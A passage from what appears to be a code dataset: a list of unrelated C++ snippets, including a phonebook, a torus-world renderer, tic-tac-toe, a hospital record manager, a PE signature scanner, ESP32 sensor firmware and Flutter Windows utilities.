this->_contacts[index].getDarkestSecret();\n\tstd::cout << \"---------------------------------------------\" << std::endl;\n\tstd::cout << \"Contact info\" << std::endl;\n\tstd::cout << \"---------------------------------------------\" << std::endl;\n\tstd::cout << \"First name: \" << firstName << std::endl;\n\tstd::cout << \"Last name: \" << lastName << std::endl;\n\tstd::cout << \"Nickname: \" << nickname << std::endl;\n\tstd::cout << \"Phone number: \" << phoneNumber << std::endl;\n\tstd::cout << \"Darkest secret: \" << darkestSecret << std::endl;\n\tstd::cout << \"---------------------------------------------\" << std::endl;\n\treturn ;\n}\n\nbool PhoneBook::isaString(std::string str)\n{\n\tint i = 0;\n\n\tif(str.empty())\n\t{\n\t\tstd::cout << \"STRING CANNOT BE EMPTY!!\" << std::endl;\n\t\treturn (false);\n\t}\n\twhile (str[i])\n\t{\n\t\tif (!std::isalpha(str[i]))\n\t\t{\n\t\t\tstd::cout << \"ONLY CHARACTERS ALLOWED!!\" << std::endl;\n\t\t\treturn (false);\n\t\t}\n\t\ti++;\n\t}\n\treturn (true);\n}\n\nbool PhoneBook::isaPnumber(std::string str)\n{\n\tint i = 1;\n\n\tif(str.empty())\n\t{\n\t\tstd::cout << \"STRING CANNOT BE EMPTY!!\" << std::endl;\n\t\treturn (false);\n\t}\n\tif (str[0] != '+' && !std::isdigit(str[0]))\n\t{\n\t\tstd::cout << \"Invalid input\" << std::endl;\n\t\treturn (false);\n\t}\n\twhile (str[i])\n\t{\n\t\tif (!std::isdigit(str[i]))\n\t\t{\n\t\t\tstd::cout << \"ONLY DIGITS ALLOWED!!\" << std::endl;\n\t\t\treturn (false);\n\t\t}\n\t\ti++;\n\t}\n\treturn (true);\n}\n\nbool PhoneBook::isaNick(std::string str)\n{\n\tint i = 0;\n\n\tif(str.empty())\n\t{\n\t\tstd::cout << \"STRING CANNOT BE EMPTY!!\" << std::endl;\n\t\treturn (false);\n\t}\n\twhile (str[i])\n\t{\n\t\tif (!std::isalnum(str[i]))\n\t\t{\n\t\t\tstd::cout << \"ONLY DIGITS and CHARACTERS ALLOWED!!\" << std::endl;\n\t\t\treturn (false);\n\t\t}\n\t\ti++;\n\t}\n\treturn (true);\n}\n\nbool PhoneBook::isaSentence(std::string str)\n{\n\tint i = 0;\n\n\tif(str",
    "#define _USE_MATH_DEFINES\r\n\r\n#include <SFML/Graphics.hpp>\r\n#include \"windows.h\" \r\n\r\n\r\nvoid cudathingy(uint8_t* pixels, double pos0, double pos1, double pos2, double vec0, double vec1, double vec2, double addy0, double addy1, double addy2, double addz0, double addz1, double addz2, bool inside, double alpha, double beta, double bigr, double r, bool other, double dx, double dy, double dz, int currx, int curry, int currz, int nbx, int nby, int nbz, bool* blocks1, bool* blocks2, bool rem, bool blockrand, bool reset);\r\nvoid cudaInit();\r\nvoid cudaExit();\r\n\r\ndouble toruscoll2(double a, double b, double c, double d, double e, double f, double m, double n);\r\ndouble solvequartic2(double a0, double b0, double c0, double d0, double e0);\r\nvoid tormat2(double phi, double theta, double* mat);\r\ndouble matdet2(double* m);\r\nvoid matinv2(double* m, double* res);\r\nvoid matmult2(double* m1, double* m2, double* res);\r\nvoid matact2(double* m, double vecn0, double vecn1, double vecn2, double* nvecn);\r\nvoid matflipcpu(double* m, double* res);\r\nvoid matflip2cpu(double* m, double* res);\r\nvoid setblockscpu(bool* blocks1, bool* blocks2);\r\nvoid setblocksrandcpu(bool* blocks1, bool* blocks2);\r\n\r\nstatic bool blocks1[30 * 30 * 30]{};\r\nstatic bool blocks2[30 * 30 * 30]{};\r\n\r\nint main()\r\n{\r\n    ShowWindow(GetConsoleWindow(), SW_HIDE);\r\n\t//ShowWindow(GetConsoleWindow(), SW_SHOW);\r\n\r\n\tdouble r = 1.0;\r\n\tdouble bigr = 1.5;\r\n\r\n\tdouble roomsize = 10.0;\r\n\tdouble schecker = 1.0;\r\n\tdouble dist = 2.0;\r\n\tdouble sqsz = 0.01 / 4;\r\n\tdouble speed = 0.01;\r\n\tdouble alpha = 1.0;\r\n\tdouble beta = 5.0;\r\n\r\n\r\n\tdouble alpha2 = 1.0;\r\n\tdouble beta2 = beta - alpha;\r\n\r\n\r\n\tdouble outangle=0;\r\n\r\n\tbool other = false;\r\n\r\n\tdouble anglex, angley;\r\n\tdouble xl;\r\n\tdouble dotp;\r\n\r\n\tdouble vl, geoang;\r\n\r\n\tdouble tmppos0, tmppos1, tmppos2, tmpx00, tmpx01, tmpx02, tmpx10, tmpx11, tmpx12, tmpx20, tmpx21, tmpx22;\r\n\r\n\tbool inside = false;\r\n\t\r\n\tbool reset = false;\r\n\r\n\r\n    int mousx, mousy, centralx, centraly;\r\n\r\n    double pos0, pos1, pos2;\r\n    double vec0, vec1, vec2;\r\n    double addy0, addy1, addy2;\r\n    double addz0, addz1, addz2;\r\n    double x00, x01, x02;\r\n    double x10, x11, x12;\r\n    double x20, x21, x22;\r\n    double multy = (1 - 1920) * sqsz / 2;\r\n    double multz = (1080-1) * sqsz / 2;\r\n\r\n\r\n    double newx00, newx01, newx02;\r\n    double newx10, newx11, newx12;\r\n    double newx20, newx21, newx22;\r\n\r\n\tdouble torcoll;\r\n\tdouble rayon;\r\n\tdouble newang;\r\n\tdouble guder;\r\n\tdouble distrem;\r\n\r\n\r\n\r\n\tdouble proj0, proj1;\r\n\r\n\tdouble tor0, tor1, tor2, xyvec, theta, phi;\r\n\tdouble mat1[9]{};\r\n\tdouble mat[9]{};\r\n\tdouble nvecn[3]{};\r\n\tdouble inv[9]{};\r\n\tdouble npos[3]{};\r\n\t\r\n\tint nbx = 30;\r\n\tint nby = 30;\r\n\tint nbz = 30;\r\n\r\n\tdouble dx = 2.0*M_PI*bigr / nbx;\r\n\tdouble dy = 2.0 * M_PI * r / nby;\r\n\tdouble dz = (beta - alpha) / nbz;\r\n\tint currx=0, curry=0, currz=0;\r\n\r\n    bool focus = true;\r\n\r\n\tbool blockrand = false;\r\n\tbool tmpinside, tmpother;\r\n\tbool rem = false;\r\n\r\n\r\n\tsetblockscpu(blocks1, blocks2);\r\n\r\n   //sf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Titlebar | sf::Style::Close);\r\n\tsf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Fullscreen);\r\n\tsf::Texture texture;\r\n    sf::Sprite sprite;\r\n    sf::Uint8* pixels = new sf::Uint8[1920 * 1080 * 4];\r\n    sf::Vector2i winpos;\r\n\r\n    cudaInit();\r\n    texture.create(1920, 1080);\r\n    window.setMouseCursorVisible(false);\r\n\r\n\tx00 = 0.0; x01 = 0.0; x02 = -1.0;\r\n\tx10 = 0.0; x11 = 1.0; x12 = 0.0;\r\n\tx20 = 1.0; x21 = 0.0; x22 = 0.0;\r\n\tpos0 = 0.0; pos1 = 0.0; pos2 = 7.93;\r\n\r\n    winpos = window.getPosition();\r\n    SetCursorPos(winpos.x + 1920 / 2, winpos.y + 1080 / 2);\r\n   \r\n    while (window.isOpen())\r\n    {\r\n        //Sleep(1);\r\n        sf::Event event;\r\n\t\t\r\n\t\twhile (window.pollEvent(event))\r\n\t\t{\r\n\t\t\tif (focus && event.type == sf::Event::KeyPressed && event.key.code == sf::Keyboard::J)\r\n\t\t\t{\r\n\t\t\t\tsetblocksrandcpu(blocks1,blocks2);\r\n\t\t\t\tblockrand = true;\r\n\t\t\t}\r\n\r\n\t\t\tif (event.type == sf::Event::Closed)\r\n\t\t\t\twindow.close();\r\n\r\n\t\t\tif (focus && event.type == sf::Event::MouseMoved)\r\n\t\t\t{\r\n\t\t\t\tPOINT p;\r\n\t\t\t\tGetCursorPos(&p);\r\n\t\t\t\twinpos = window.getPosition();\r\n\t\t\t\tcentralx = winpos.x + 1920 / 2;\r\n\t\t\t\tcentraly = winpos.y + 1080 / 2;\r\n\t\t\t\tSetCursorPos(centralx, centraly);\r\n\r\n\t\t\t\tmousx = p.x - centralx;\r\n\t\t\t\tmousy = p.y - centraly;\r\n\r\n\t\t\t\tanglex = 0.002 * mousx;\r\n\t\t\t\tangley = 0.002 * mousy;\r\n\r\n\t\t\t\tif (anglex < 0) anglex *= -1;\r\n\t\t\t\tif (angley < 0) angley *= -1;\r\n\r\n\r\n\t\t\t\tif (mousx > 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tnewx00 = x00 * cos(anglex) + sin(anglex) * x10;\r\n\t\t\t\t\tnewx10 = x10 * cos(anglex) - sin(anglex) * x00;\r\n\t\t\t\t\tx00 = newx00;\r\n\t\t\t\t\tx10 = newx10;\r\n\r\n\t\t\t\t\tnewx01 = x01 * cos(anglex) + sin(anglex) * x11;\r\n\t\t\t\t\tnewx11 = x11 * cos(anglex) - sin(anglex) * x01;\r\n\t\t\t\t\tx01 = newx01;\r\n\t\t\t\t\tx11 = newx11;\r\n\r\n\t\t\t\t\tnewx02 = x02 * cos(anglex) + sin(anglex) * x12;\r\n\t\t\t\t\tnewx12 = x12 * cos(anglex) - sin(anglex) * x02;\r\n\t\t\t\t\tx02 = newx02;\r\n\t\t\t\t\tx12 = newx12;\r\n\t\t\t\t}\r\n\t\t\t\telse if ",
    "#include \"Game.h\"\n#include <iostream>\n#include <cassert>\n// Game class Contructor\nGame::Game(int dimension, std::vector<Player*> players, int currentIndex) :dimension{ dimension }, players{ players }, currentIndex{ currentIndex }, \nboard{std::vector<std::vector<int>>(dimension, std::vector<int> (dimension,-1)) }\n{assert(board.size() == dimension); }\nGameState Game::getGameState()  {\n\treturn this->gstate;\n}\nvoid Game::SetState(GameState state) {\n\tgstate = state;\n}\nint Game::getCurretIndex() const {\n\treturn this->currentIndex;\n\t\n}\nvoid Game::setCurretIndex(int index)  {\n\tthis->currentIndex = index;\n\n}\nvoid Game::DisplayBoard() const {\n\tchar currentPlayersymbol = ' ';\n\n\t\n\tfor (int i = 0; i < players.size(); i++)\n\t{\n\t\tif (players[i]->getid() == currentIndex % players.size())\n\t\t\tcurrentPlayersymbol = players[i]->getSymbol();\n\t}\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\tstd::cout << \"| \" << \" \" << \" |\";\n\t\t\t}\n\t\t\telse \n\t\t\t{\n\t\t\t\tint value = board[i][j];\n\t\t\t\t\n\t\t\t\tfor (int i = 0; i < players.size(); i++)\n\t\t\t\t{\n\t\t\t\t\tif (value == players[i]->getid())\n\t\t\t\t\t{\n\t\t\t\t\t\tstd::cout << \"| \" << players[i]->getSymbol() << \" |\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t\tstd::cout<< std::endl;\n\n\t}\n\n}\nvoid Game::GetAndMakeMove() {\n\tPlayer::PlayerType currentPlayertype = Player::PlayerType::HUMAN;\n\tCoordinates c = { 0,0 };\n\n\n\tfor (int i = 0; i < players.size(); i++)\n\t{\n\t\tif (players[i]->getid() == currentIndex % players.size())\n\t\t{\n\t\t\tcurrentPlayertype = players[i]->getType();\n\t\t\tif (currentPlayertype == Player::PlayerType::HUMAN)\n\t\t\t{\n\t\t\t\tc = players[i]->getMove(board);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tc = players[i]->getMove(board);\n\t\t\t}\n\t\t}\n\t}\n\tboard[c.x][c.y] = currentIndex % players.size();\n\n\n}\nbool Game::CheckWinner() {\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tstd::map<int, int> countmap;\n\t\tfor (int k = 0; k < players.size(); k++)\n\t\t{\n\t\t\tcountmap.insert(std::pair < int, int>(players[k]->getid(), 0));\n\t\t}\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] != -1) {\n\t\t\t\tif (countmap.find(board[i][j]) != countmap.end())\n\t\t\t\t{\n\t\t\t\t\tint value = countmap.at(board[i][j]);\n\t\t\t\t\tvalue = value + 1;\n\t\t\t\t\tcountmap[board[i][j]] = value;\n\t\t\t\t\tif (value == board.size())\n\t\t\t\t\t{\n\t\t\t\t\t\tSetState(GameState::WIN);\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tstd::map<int, int> countmap2;\n\t\tfor (int k = 0; k < players.size(); k++)\n\t\t{\n\t\t\tcountmap2.insert(std::pair < int, int>(players[k]->getid(), 0));\n\t\t}\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[j][i] != -1) {\n\t\t\t\tif (countmap2.find(board[i][j]) != countmap2.end())\n\t\t\t\t{\n\t\t\t\t\tint value = countmap2.at(board[j][i]);\n\t\t\t\t\tvalue = value + 1;\n\t\t\t\t\tcountmap2[board[j][i]] = value;\n\t\t\t\t\tif (value == board.size())\n\t\t\t\t\t{\n\t\t\t\t\t\tSetState(GameState::WIN);\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t//\n\n\treturn false;\n}\nbool Game::CheckDraw() {\n\tif (getGameState() == GameState::WIN)\n\t{\n\t\treturn false;\n\t}\n\t\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n\tSetState(GameState::DRAW);\n}\n//Human Class // Bot class all attributes\nHumanPlayer::HumanPlayer(std::string name, char symbol, int id) : name{ name }, symbol{ symbol }, id{ id } {}\nBotPlayer::BotPlayer(std::string name, char symbol, int id) : name{ name }, symbol{ symbol }, id{ id } {}\nPlayer::PlayerType HumanPlayer::getType() const{\n\treturn Player::PlayerType::HUMAN;\n}\nstd::string HumanPlayer::getName() const {\n\treturn this->name;\n}\nint HumanPlayer::getid() const {\n\treturn this->id;\n}\nchar HumanPlayer::getSymbol() const {\n\treturn this->symbol;\n}\nCoordinates HumanPlayer::getMove(std::vector<std::vector<int>>const& board) const {\n\t// to get from std::cin\n\tstd::cout << \"Hello \" << this->name << \" its your turn, please input row number\" << std::endl;\n\tint r;\n\tint c;\n\tstd::cin >> r;\n\tstd::cout << \"please input column number\" << std::endl;\n\tstd::cin >> c;\n\tstd::cout << \" you made a move at \" << r << \" and \" << c<< std::endl;\n\treturn Coordinates{ r, c };\n\t\n}\nCoordinates BotPlayer::getMove(std::vector<std::vector<int>>const& board) const {\n\n\t//bot easy strategy\n\n\tfor (int i = 0; i < board.size(); i++)\n\t{\n\t\tfor (int j = 0; j < board.size(); j++)\n\t\t{\n\t\t\tif (board[i][j] == -1)\n\t\t\t{\n\t\t\t\tstd::cout << \" bot make a move at \" << i << \" and \" << j << std::endl;\n\t\t\t\treturn Coordinates{ i, j };\n\t\t\t}\n\t\t}\n\t}\n\tassert(false);\n\n}\nPlayer::PlayerType BotPlayer::getType() const {\n\treturn Player::PlayerType::BOT;\n}\nstd::string BotPlayer::getName() const {\n\treturn this->name;\n}\nchar BotPlayer::getSymbol() const {\n\treturn this->symbol;\n}\nint BotPlayer::getid() const {\n\treturn this->id;\n}",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n\nusing namespace std;\n\nclass Hospital {\nprivate:\n    string Name, Address, BloodGrp, Age;\n\npublic:\n    // Constructor\n    Hospital() {\n        Name = \"Empty\";\n        Address = \"Empty\";\n        BloodGrp = \"Empty\";\n        Age = \"Empty\";\n    }\n\n    Hospital(string name, string address, string bloodGrp, string age) {\n        Name = name;\n        Address = address;\n        BloodGrp = bloodGrp;\n        Age = age;\n    }\n\n    // Setters\n    void setName(string name) { Name = name; }\n    void setAddress(string address) { Address = address; }\n    void setBloodGrp(string bloodGrp) { BloodGrp = bloodGrp; }\n    void setAge(string age) { Age = age; }\n\n    // Getters\n    string getName() const { return Name; }\n    string getAddress() const { return Address; }\n    string getBloodGrp() const { return BloodGrp; }\n    string getAge() const { return Age; }\n};\n\n// function to read patient data from file\nvector<Hospital> readPatientsFromFile() {\n    vector<Hospital> patients;\n    ifstream fileIn(\"patients.txt\");\n    if (!fileIn.is_open()) {\n        cout << \"File does not exist!\";\n        return patients;\n    }\n\n    string line;\n    while (getline(fileIn, line)) {\n        stringstream ss(line);\n        string name, address, bloodGrp, age;\n        getline(ss, name, '|');\n        getline(ss, address, '|');\n        getline(ss, bloodGrp, '|');\n        getline(ss, age);\n        patients.push_back(Hospital(name, address, bloodGrp, age));\n    }\n    fileIn.close();\n    return patients;\n}\n\n// function to write patient data to file\nvoid writePatientsToFile(const vector<Hospital>& patients) {\n    ofstream fileOut(\"patients.txt\");\n    if (!fileOut.is_open()) {\n        cout << \"File does not exist!\";\n        return;\n    }\n\n    for (size_t i = 0; i < patients.size(); ++i) {\n        const auto& patient = patients[i];\n        fileOut << patient.getName() << \"|\" << patient.getAddress() << \"|\" << patient.getBloodGrp() << \"|\" << patient.getAge() << endl;\n    }\n\n    fileOut.close();\n}\n\n// function to admit a patient\nvoid admitPatient(vector<Hospital>& patients) {\n    string name, address, bloodGrp, age;\n\n    cout << \"\\t Enter Patient Name: \";\n    cin.ignore();\n    getline(cin, name);\n\n    cout << \"\\t Enter Patient Address: \";\n    getline(cin, address);\n\n    cout << \"\\t Enter Patient Blood Group: \";\n    getline(cin, bloodGrp);\n\n    cout << \"\\t Enter Patient Age: \";\n    getline(cin, age);\n\n    // Create a new patient object and add it to the vector\n    Hospital newPatient(name, address, bloodGrp, age);\n    patients.push_back(newPatient);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n\n    cout << \"\\n\\t Patient Data Saved Successfully!!!\\n\" << endl;\n}\n\n// function to discharge a patient\nvoid dischargePatient(vector<Hospital>& patients) {\n    if (patients.empty()) {\n        cout << \"No patients to discharge!\" << endl;\n        return;\n    }\n\n    cout << \"\\t List of Patients:\" << endl;\n    for (size_t i = 0; i < patients.size(); ++i) {\n        cout << \"\\t \" << i + 1 << \". \" << patients[i].getName() << endl;\n    }\n\n    int choice;\n    cout << \"\\t Enter the number of the patient to discharge: \";\n    cin >> choice;\n\n    if (choice < 1 || choice > static_cast<int>(patients.size())) {\n        cout << \"\\t Invalid choice!\" << endl;\n        return;\n    }\n\n    cout << \"\\n\\t The Patient \" << patients[choice - 1].getName() << \", is Discharged!!!\\n\" << endl;\n\n    // Erase the discharged patient from the vector\n    patients.erase(patients.begin() + choice - 1);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n}\n\nint main() {\n    bool isExit = false;\n    vector<Hospital> patients;\n\n    // Load patients from file\n    patients = readPatientsFromFile();\n\n    while (!isExit) {\n        system(\"cls\");\n\n        int userVal;\n        cout << \"\\t ~ Hospital Management System ~\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t 1. Admit Patient\" << endl;\n        cout << \"\\t 2. Discharge Patient\" << endl;\n        cout << \"\\t 3. See All Patients\" << endl;\n        cout << \"\\t 4. About Us\" << endl;\n        cout << \"\\t 5. Contact Info\" << endl;\n        cout << \"\\t 6. Exit\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t Enter your choice: \";\n        cin >> userVal;\n\n        switch (userVal) {\n            case 1:\n                system(\"cls\");\n                admitPatient(patients);\n                system(\"pause\");\n                break;\n            case 2:\n                system(\"cls\");\n                dischargePatient(patients);\n                system(\"pause\");\n                break;\n            case 3:\n                system(\"cls\");\n                // Display all patients\n                for (size_t i = 0; i < patients.size(); ++i) {\n                    const auto& patient = patients[i];\n                    cout << ",
    "#include \"Scanner.h\"\r\n\r\nvoid* PatternScan(void* module, const char* signature){\r\n    static auto pattern_to_byte = [](const char* pattern) {\r\n        auto bytes = std::vector<int>{};\r\n        auto start = const_cast<char*>(pattern);\r\n        auto end = const_cast<char*>(pattern) + strlen(pattern);\r\n\r\n        for (auto current = start; current < end; ++current) {\r\n            if (*current == '?') {\r\n                ++current;\r\n                if (*current == '?')\r\n                    ++current;\r\n                bytes.push_back(-1);\r\n            }\r\n            else {\r\n                bytes.push_back(strtoul(current, &current, 16));\r\n            }\r\n        }\r\n        return bytes;\r\n    };\r\n\r\n    auto dosHeader = (PIMAGE_DOS_HEADER)module;\r\n    auto ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)module + dosHeader->e_lfanew);\r\n\r\n    auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;\r\n    auto patternBytes = pattern_to_byte(signature);\r\n    auto scanBytes = reinterpret_cast<std::uint8_t*>(module);\r\n\r\n    auto s = patternBytes.size();\r\n    auto d = patternBytes.data();\r\n\r\n    for (auto i = 0ul; i < sizeOfImage - s; ++i) {\r\n        bool found = true;\r\n        for (auto j = 0ul; j < s; ++j) {\r\n            if (scanBytes[i + j] != d[j] && d[j] != -1) {\r\n                found = false;\r\n                break;\r\n            }\r\n        }\r\n        if (found) {\r\n            return &scanBytes[i];\r\n        }\r\n    }\r\n    return nullptr;\r\n}",
    "#include <Arduino.h>\n#include <DHT.h>\n#include <BLEServer.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include <PubSubClient.h>\n#include <WiFi.h>\n#include \"Credentials.h\"\n#include <iostream>\n\nusing namespace std;\n\n#define LEDPIN 2\n#define DHTPIN 5\n#define DHTTYPE DHT11\n#define READ_INTERVAL 2000\n#define SERVICE_UUID \"2aeb149a-4803-11ee-be56-0242ac120002\"\n#define HUMIDITY_UUID \"3ab43154-4803-11ee-be56-0242ac120002\"\n#define TEMPERATURE_UUID \"404dccd8-4803-11ee-be56-0242ac120002\"\n\n// Set MQTT Broker\n\nconst char *mqtt_broker = \"test.mosquitto.org\";\nconst char *topic = \"MOISES/ESP3\"; //Set the topic here before -- DO NOT FORGET TO SET THE TOPIC HERE\nconst char *topic2 = \"MOISES/ESP2\";\nconst char *mqqtt_username = \"\";\nconst char *mqtt_password = \"\";\nconst int mqtt_port = 1883;\n\nbool mqttStatus = 0;\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nbool connectMQTT();\nvoid callback(char *topic, byte *payload, unsigned int lenght);\n\nWiFiServer server_wifi(80);\n\nDHT dht(DHTPIN, DHTTYPE);\n\nBLEServer *server = nullptr;\nBLECharacteristic *temperatureChar = nullptr;\nBLECharacteristic *humidityChar = nullptr;\n\nfloat lastTemperature = -999;\nfloat lastHumidity = -999;\nint devicesConnected = 0;\nunsigned int blinkMillis = 0;\nunsigned int readkMillis = 0;\n\nclass ServerCallbacks: public BLEServerCallbacks{\n    void onConnect(BLEServer *s){\n      Serial.println(\"Device connected\");\n      devicesConnected++;\n      BLEDevice::startAdvertising();\n    }\n\n    void onDisconnect(BLEServer *s){\n      Serial.println(\"Device disconnected\");\n      devicesConnected--;\n    }\n};\n\nvoid setup() {\n  Serial.begin(9600);\n\n  Serial.println(\"Starting...\");\n\n  Serial.println();\n  Serial.println(\"Connecting in \");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED){\n    delay(741);\n    Serial.print(\".\");\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"WiFi connected!\");\n  Serial.println(\"IP: \");\n  Serial.println(WiFi.localIP());\n\n  mqttStatus = connectMQTT();\n\n  dht.begin();\n  pinMode(LEDPIN, OUTPUT);\n\n  BLEDevice::init(\"ESP32\");\n  server = BLEDevice::createServer();\n  server->setCallbacks(new ServerCallbacks());\n\n  BLEService *service = server->createService(SERVICE_UUID);\n\n  temperatureChar = service->createCharacteristic(\n    TEMPERATURE_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  humidityChar = service->createCharacteristic(\n    HUMIDITY_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  service->start();\n\n  BLEAdvertising *advertising = BLEDevice::getAdvertising();\n  advertising->addServiceUUID(SERVICE_UUID);\n  advertising->setScanResponse(false);\n  advertising->setMinPreferred(0x06);\n\n  BLEDevice::startAdvertising();\n\n  Serial.println(\"Advertising...\");\n}\n\nvoid sense() {\n  float humidity = dht.readHumidity();\n  float temperature = dht.readTemperature();\n\n  if(isnan(humidity)){\n    Serial.println(\"Humidity reading failed!\");\n    return;\n  }\n\n  if(isnan(temperature)){\n    Serial.println(\"Temperature reading failed!\");\n    return;\n  }\n\n  Serial.printf(\"Humidity = %f | Temperature = %f \\n\", humidity, temperature);\n\n//Adicionar a linha de c\u00f3digo para publicar as vari\u00e1veis aqui\nclient.publish(topic, String(temperature).c_str());\n\n\n  if(devicesConnected){\n    if (lastTemperature != temperature){\n      temperatureChar->setValue(temperature);\n      temperatureChar->notify();\n\n      lastTemperature = temperature;\n    }\n  \n    if (lastHumidity != humidity){\n      humidityChar->setValue(humidity);\n      humidityChar->notify();\n\n      lastHumidity = humidity;\n    }\n  }\n}\n\nvoid loop() {\n  if(mqttStatus){\n    client.loop();\n  }\n  while(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, password);\n    Serial.print(\".\");\n\n    delay(741);\n  }\n  if(readkMillis == 0 || (millis() - readkMillis) >= READ_INTERVAL) {\n      sense();\n      readkMillis = millis();\n  }\n\n  if (!devicesConnected){\n    if (blinkMillis == 0 || (millis() - blinkMillis) >= 1000) {\n      digitalWrite(LEDPIN, !digitalRead(LEDPIN));\n      blinkMillis = millis();\n    }\n  } else {\n    digitalWrite(LEDPIN, HIGH);\n  }\n}\n\nbool connectMQTT() {\n  byte tentativa = 0;\n  client.setServer(mqtt_broker, mqtt_port);\n  client.setCallback(callback);\n\n  do{\n    String client_id = \"TEST-\";\n    client_id += String(WiFi.macAddress());\n\n    if (client.connect(client_id.c_str(), mqqtt_username, mqtt_password)) {\n      Serial.println(\"Connection sucessful: \");\n      Serial.printf(\"Client %s connected on Broker \\n\", client_id.c_str());\n    } else {\n      Serial.print(\"Connection failed: \");\n      Serial.print(client.state());\n      Serial.println();\n      Serial.print(\"New try: \");\n      delay(2000);\n    }\n    tentativa++;\n  } while (!client.connected() && tentativa < 5);\n\n  if (tentativa < 5) {\n    \n    client.subscribe(topic);\n    return 1;\n  } else {\n    Serial.println(\"Do not connected!\");\n    return 0;\n  }\n}\n\nvoid callback(char *topic, byte *payload, unsigne",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <fstream>\n#include <filesystem>\n#include <sstream>\n#include <queue>\n\n\n#define VERSION \"1.1.0\"\n\n#if defined(_WIN32) || defined(_WIN64) || \\\n    defined(__WIN32__) || defined(__TOS_WIN__) || \\\n    defined(__WINDOWS__)\n#    define ENV \"windows\"\n#    define Windows\n#elif defined(linux) || defined(__linux) || \\\n    defined(__linux__) || defined(__gnu_linux__)\n#    define ENV \"linux\"\n#elif defined(macintosh) || defined(Macintosh) || \\\n    (defined(__APPLE__) && defined(__MACH__))\n#    define ENV \"macos\"\n#else\n#    error Unsupported OS\n#endif\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define ARC \"x86_64\"\n#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)\n#define ARC \"x86_32\"\n#else\n#define ARC \"arm\"\n#endif\n\n\nstruct Node;\n\nstruct Edge {\n    size_t indx_to;\n    size_t indx_from;\n    float cost;\n};\n\nstruct Node {\n    std::string name;\n    std::vector<Edge> edge;\n};\n\n\ninline int convertToInt(const std::string& str) {\n    return *(reinterpret_cast<const int*>(str.c_str()));\n}\n\ninline void interupted() {\n    std::cout << \"interrupted\\n\";\n}\n\n\nstd::unordered_map<std::string, size_t> name_map;\nstd::vector<Node> graph;\nsize_t nod_origin_index = 